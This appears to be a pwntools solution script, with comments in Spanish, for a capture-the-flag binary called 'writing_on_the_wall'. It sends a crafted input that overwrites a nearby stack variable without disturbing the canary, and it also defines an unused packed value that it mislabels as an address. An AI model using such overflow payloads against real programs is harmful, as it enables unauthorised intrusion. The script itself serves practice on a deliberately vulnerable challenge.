from pwn import *

# Establecer la conexión con el programa writing_on_the_wall
p = process('./writing_on_the_wall')

# Dirección hexadecimal de local_18 (en little-endian)
local_18_address = p64(0x2073736170743377)

# Se envía el payload cuidadosamente diseñado para evitar corrupción del canario
payload = b' ssapt3\x00'

# Enviar la entrada necesaria
p.sendline(payload)

# Recibir la salida del programa
output = p.recvall()

# Imprimir la salida del programa
print(output.decode())

